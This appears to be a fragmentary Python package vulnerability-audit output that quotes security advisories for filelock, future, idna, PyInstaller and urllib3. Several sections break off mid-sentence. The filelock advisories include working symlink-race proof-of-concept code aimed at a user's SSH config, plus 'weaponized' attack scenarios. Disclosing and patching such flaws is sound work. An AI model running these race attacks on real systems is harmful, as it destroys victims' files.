The vulnerability exists in both Unix and Windows lock file creation where filelock checks if a file exists before opening it with O_TRUNC. An attacker can create a symlink pointing to a victim file in the time gap between the check and open, causing os.open() to follow the symlink and truncate the target file.  **Who is impacted:**  All users of filelock on Unix, Linux, macOS, and Windows systems. The vulnerability cascades to dependent libraries:  - **virtualenv users**: Configuration files can be overwritten with virtualenv metadata, leaking sensitive paths - **PyTorch users**: CPU ISA cache or model checkpoints can be corrupted, causing crashes or ML pipeline failures - **poetry/tox users**: through using virtualenv or filelock on their own.  Attack requires local filesystem access and ability to create symlinks (standard user permissions on Unix; Developer Mode on Windows 10+). Exploitation succeeds within 1-3 attempts when lock file paths are predictable.  ### Patches  Fixed in version **3.20.1**.  **Unix/Linux/macOS fix:** Added O_NOFOLLOW flag to os.open() in UnixFileLock.\\_acquire() to prevent symlink following.  **Windows fix:** Added GetFileAttributesW API check to detect reparse points (symlinks/junctions) before opening files in WindowsFileLock.\\_acquire().  **Users should upgrade to filelock 3.20.1 or later immediately.**  ### Workarounds  If immediate upgrade is not possible:  1. Use SoftFileLock instead of UnixFileLock/WindowsFileLock (note: different locking semantics, may not be suitable for all use cases) 2. Ensure lock file directories have restrictive permissions (chmod 0700) to prevent untrusted users from creating symlinks 3. Monitor lock file directories for suspicious symlinks before running trusted applications  **Warning:** These workarounds provide only partial mitigation. The race condition remains exploitable. Upgrading to version 3.20.1 is strongly recommended.  ______________________________________________________________________  ## Technical Details: How the Exploit Works  ### The Vulnerable Code Pattern  **Unix/Linux/macOS** (`src/filelock/_unix.py:39-44`):  ```python def _acquire(self) -> None:     ensure_directory_exists(self.lock_file)     open_flags = os.O_RDWR | os.O_TRUNC  # (1) Prepare to truncate     if not Path(self.lock_file).exists():  # (2) CHECK: Does file exist?         open_flags |= os.O_CREAT     fd = os.open(self.lock_file, open_flags, ...)  # (3) USE: Open and truncate ```  **Windows** (`src/filelock/_windows.py:19-28`):  ```python def _acquire(self) -> None:     raise_on_not_writable_file(self.lock_file)  # (1) Check writability     ensure_directory_exists(self.lock_file)     flags = os.O_RDWR | os.O_CREAT | os.O_TRUNC  # (2) Prepare to truncate     fd = os.open(self.lock_file, flags, ...)  # (3) Open and truncate ```  ### The Race Window  The vulnerability exists in the gap between operations:  **Unix variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file exists? \u2192 False T1                                             \u2193 RACE WINDOW T2                                             Create symlink: lock \u2192 victim_file T3      Open lock_file with O_TRUNC         \u2192 Follows symlink         \u2192 Opens victim_file         \u2192 Truncates victim_file to 0 bytes! \u2620\ufe0f ```  **Windows variant:**  ``` Time    Victim Thread                          Attacker Thread ----    -------------                          --------------- T0      Check: lock_file writable?

Attacker Setup:**  ```python # Attacker identifies target application using filelock lock_path = \"/tmp/myapp.lock\"  # Predictable lock path victim_file = \"/home/victim/.ssh/config\"  # High-value target ```  **2. Attacker Creates Race Condition:**  ```python import os import threading   def attacker_thread():     # Remove any existing lock file     try:         os.unlink(lock_path)     except FileNotFoundError:         pass      # Create symlink pointing to victim file     os.symlink(victim_file, lock_path)     print(f\"[Attacker] Created: {lock_path} \u2192 {victim_file}\")   # Launch attack threading.Thread(target=attacker_thread).start() ```  **3. Victim Application Runs:**  ```python from filelock import UnixFileLock  # Normal application code lock = UnixFileLock(\"/tmp/myapp.lock\") lock.acquire()  # \u2190 VULNERABILITY TRIGGERED HERE # At this point, /home/victim/.ssh/config is now 0 bytes! ```  **4. What Happens Inside os.open():**  On Unix systems, when `os.open()` is called:  ```c // Linux kernel behavior (simplified) int open(const char *pathname, int flags) {     struct file *f = path_lookup(pathname);  // Resolves symlinks by default!      if (flags & O_TRUNC) {         truncate_file(f);  // \u2190 Truncates the TARGET of the symlink     }      return file_descriptor; } ```  Without `O_NOFOLLOW` flag, the kernel follows the symlink and truncates the target file.  ### Why the Attack Succeeds Reliably  **Timing Characteristics:**  - **Check operation** (Path.exists()): ~100-500 nanoseconds - **Symlink creation** (os.symlink()): ~1-10 microseconds - **Race window**: ~1-5 microseconds (very small but exploitable) - **Thread scheduling quantum**: ~1-10 milliseconds  **Success factors:**  1. **Tight loop**: Running attack in a loop hits the race window within 1-3 attempts 2. **CPU scheduling**: Modern OS thread schedulers frequently context-switch during I/O operations 3. **No synchronization**: No atomic file creation prevents the race 4. **Symlink speed**: Creating symlinks is extremely fast (metadata-only operation)  ### Real-World Attack Scenarios  **Scenario 1: virtualenv Exploitation**  ```python # Victim runs: python -m venv /tmp/myenv # Attacker racing to create: os.symlink(\"/home/victim/.bashrc\", \"/tmp/myenv/pyvenv.cfg\")  # Result: /home/victim/.bashrc overwritten with: # home = /usr/bin/python3 # include-system-site-packages = false # version = 3.11.2 # \u2190 Original .bashrc contents LOST + virtualenv metadata LEAKED to attacker ```  **Scenario 2: PyTorch Cache Poisoning**  ```python # Victim runs: import torch # PyTorch checks CPU capabilities, uses filelock on cache # Attacker racing to create: os.symlink(\"/home/victim/.torch/compiled_model.pt\", \"/home/victim/.cache/torch/cpu_isa_check.lock\")  # Result: Trained ML model checkpoint truncated to 0 bytes # Impact: Weeks of training lost, ML pipeline DoS ```  ### Why Standard Defenses Don't Help  **File permissions don't prevent this:**  - Attacker doesn't need write access to victim_file - os.open() with O_TRUNC follows symlinks using the *victim's* permissions - The victim process truncates its own file  **Directory permissions help but aren't always feasible:**  - Lock files often created in shared /tmp directory (mode 1777) - Applications may not control lock file location - Many apps use predictable paths in user-writable directories  **File locking doesn't prevent this:**  - The truncation happens *during* the open() call, before any lock is acquired - fcntl.flock() only prevents concurrent lock acquisition, not symlink attacks  ### Exploitation Proof-of-Concept Results  From empirical testing with the provided PoCs:  **Simple Direct Attack** (`filelock_simple_poc.py`):  - Success rate: 33% per attempt (1 in 3 tries) - Average attempts to success: 2.1 - Target file reduced to 0 bytes in \\<100ms  **virtualenv Attack** (`weaponized_virtualenv.py`):  - Success rate: ~90% on first attempt (deterministic timing) - Information leaked: File paths, Python version, system configuration - Data corruption: Complete loss of original file contents  **PyTorch Attack** (`weaponized_pytorch.py`):  - Success rate: 25-40% per attempt - Impact: Application crashes, model loading failures - Recovery: Requires cache rebuild or model retraining  **Discovered and reported by:** George Tsigourakos (@tsigouris007)"}, {"id": "GHSA-qmgc-5h2g-mvrw", "fix_versions": ["3.20.3"], "aliases": ["CVE-2026-22701"], "description": "## Vulnerability Summary  **Title:** Time-of-Check-Time-of-Use (TOCTOU) Symlink Vulnerability in SoftFileLock  **Affected Component:** `filelock` package - `SoftFileLock` class **File:** `src/filelock/_soft.py` lines 17-27 **CWE:** CWE-362, CWE-367, CWE-59  ---  ## Description  A TOCTOU race condition vulnerability exists in the `SoftFileLock` implementation of the filelock package. An attacker with local filesystem access and permission to create symlinks can exploit a race condition between the permission validation and file creation to cause lock operations to fail or behave unexpectedly.  The vulnerability occurs in the `_acquire()` method between `raise_on_not_writable_file()` (permission check) and `os.open()` (file creation). During this race window, an attacker can create a symlink at the lock file path, potentially causing the lock to operate on an unintended target file or leading to denial of service.  ### Attack Scenario  ``` 1. Lock attempts to acquire on /tmp/app.lock 2. Permission validation passes 3. [RACE WINDOW] - Attacker creates: ln -s /tmp/important.txt /tmp/app.lock 4. os.open() tries to create lock file 5. Lock operates on attacker-controlled target file or fails ```  ---  ## Impact  _What kind of vulnerability is it? Who is impacted?_  This is a **Time-of-Check-Time-of-Use (TOCTOU) race condition vulnerability** affecting any application using `SoftFileLock` for inter-process synchronization.  **Affected Users:** - Applications using `filelock.SoftFileLock` directly - Applications using the fallback `FileLock` on systems without `fcntl` support (e.g., GraalPy)  **Consequences:** - **Silent lock acquisition failure** - applications may not detect that exclusive resource access is not guaranteed - **Denial of Service** - attacker can prevent lock file creation by maintaining symlink - **Resource serialization failures** - multiple processes may acquire \"locks\" simultaneously - **Unintended file operations** - lock could operate on attacker-controlled files  **CVSS v4.0 Score:** 5.6 (Medium) **Vector:** CVSS:4.0/AV:L/AT:L/PR:L/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N  **Attack Requirements:** - Local filesystem access to the directory containing lock files - Permission to create symlinks (standard for regular unprivileged users on Unix/Linux) - Ability to time the symlink creation during the narrow race window  ---  ## Patches  _Has the problem been patched? What versions should users upgrade to?_  Yes, the vulnerability has been patched by adding the `O_NOFOLLOW` flag to prevent symlink following during lock file creation.  **Patched Version:** Next release (commit: 255ed068bc85d1ef406e50a135e1459170dd1bf0)  **Mitigation Details:** - The `O_NOFOLLOW` flag is added conditionally and gracefully degrades on platforms without support - On platforms with `O_NOFOLLOW` support (most modern systems): symlink attacks are completely prevented - On platforms without `O_NOFOLLOW` (e.g., GraalPy): TOCTOU window remains but is documented  **Users should:** - Upgrade to the patched version when available - For critical deployments, consider using `UnixFileLock` or `WindowsFileLock` instead of the fallback `SoftFileLock`  ---  ## Workarounds  _Is there a way for users to fix or remediate the vulnerability without upgrading?_  For users unable to update immediately:  1. **Avoid `SoftFileLock` in security-sensitive contexts** - use `UnixFileLock` or `WindowsFileLock` when available (these were already patched for CVE-2025-68146)  2. **Restrict filesystem permissions** - prevent untrusted users from creating symlinks in lock file directories:    ```bash    chmod 700 /path/to/lock/directory    ```  3. **Use process isolation** - isolate untrusted code from lock file paths to prevent symlink creation  4. **Monitor lock operations** - implement application-level checks to verify lock acquisitions are successful before proceeding with critical operations  ---  ## References  _Are there any links users can visit to find out more?_  - **Similar Vulnerability:** CVE-2025-68146 (TOCTOU vulnerability in UnixFileLock/WindowsFileLock) - **CWE-362 (Concurrent Execution using Shared Resource):** https://cwe.mitre.org/data/definitions/362.html - **CWE-367 (Time-of-check Time-of-use Race Condition):** https://cwe.mitre.org/data/definitions/367.html - **CWE-59 (Improper Link Resolution Before File Access):** https://cwe.mitre.org/data/definitions/59.html - **O_NOFOLLOW documentation:** https://man7.org/linux/man-pages/man2/open.2.html - **GitHub Repository:** https://github.com/tox-dev/filelock  ---  **Reported by:** George Tsigourakos (@tsigouris007)"}]}, {"name": "fqdn", "version": "1.5.1", "vulns": []}, {"name": "future", "version": "0.18.2", "vulns": [{"id": "PYSEC-2022-42991", "fix_versions": ["0.18.3"], "aliases": ["CVE-2022-40899"], "description": "An issue discovered in Python Charmers Future 0.18.2 and earlier allows remote attackers to cause a denial of service via crafted Set-Cookie header from malicious web server."}]}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.46", "vulns": []}, {"name": "idna", "version": "2.5", "vulns": [{"id": "PYSEC-2024-60", "fix_versions": ["3.7"], "aliases": ["CVE-2024-3651"], "description": "A vulnerability was identified in the kjd/idna library, specifically within the `idna.encode()` function, affecting version 3.6.

Application is built with PyInstaller < 6.0.0; both onedir and onefile mode are affected. 2. Optional bytecode encryption code feature was **not** enabled during the application build. 3. The attacker can create files/directories in the same directory where the executable is located. 4. The filesystem supports creation of files/directories that contain `?` in their name (i.e., non-Windows systems). 5. The attacker is able to determine the offset at which the PYZ archive is embedded in the executable.  The attacker can create a directory (or a zip archive) next to the executable, with the name that matches the format used by PyInstaller's bootloader to transmit information about the location of PYZ archive to the bootstrap script. If this directory (or zip archive) contains a python module whose name matches the name used by the optional bytecode encryption feature, this module will be loaded and executed by the bootstrap script (in the absence of the real, built-in module that is available when the bytecode-encryption feature is enabled). This results in arbitrary code execution that requires no modification of the executable itself.  If the executable is running with elevated privileges (for example, due to having the `setuid` bit set), the code in the injected module is also executed with the said elevated privileges, resulting in a local privilege escalation.  ### Patches  PyInstaller 6.0.0 (f5adf291c8b832d5aff7632844f7e3ddf7ad4923) removed support for bytecode encryption; this effectively removes the described attack vector, due to the bootstrap script not attempting to load the optional module for bytecode-decryption anymore.

Although this behavior is not specified in the section for redirects, it can be inferred by piecing together information from different sections and we have observed the behavior in other major HTTP client implementations like curl and web browsers. Because the vulnerability requires a previously trusted service to become compromised in order to have an impact on confidentiality we believe the exploitability of this vulnerability is low. Additionally, many users aren't putting sensitive data in HTTP request bodies, if this is the case then this vulnerability isn't exploitable. Both of the following conditions must be true to be affected by this vulnerability: 1. Using urllib3 and submitting sensitive information in the HTTP request body (such as form data or JSON) and 2.

However, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.  Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.  Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.  ## Affected usages  We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:  * Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support. * Not disabling HTTP redirects. * Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.  ## Remediation  * Using the `Proxy-Authorization` header with urllib3's `ProxyManager`. * Disabling HTTP redirects using `redirects=False` when sending requests. * Not using the `Proxy-Authorization` header."}, {"id": "GHSA-pq67-6m6q-mj2v", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50181"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.

When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too.
